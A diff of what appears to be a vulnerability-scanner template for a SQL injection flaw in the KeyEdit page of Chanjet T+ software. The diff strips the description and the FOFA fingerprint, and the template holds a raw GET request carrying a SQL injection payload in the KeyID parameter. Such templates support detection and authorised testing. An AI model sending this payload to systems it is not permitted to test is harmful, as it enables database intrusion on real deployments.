@@ -3,12 +3,8 @@ info:
   name: 用友畅捷通T+ KeyEdit注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gxdfcltomdn39bmi'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gxdfcltomdn39bmi
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - 'GET /keyEdit.aspx?KeyID=222%27%20and%201=(select%20md5(1))%20--&preload=1 HTTP/1.1
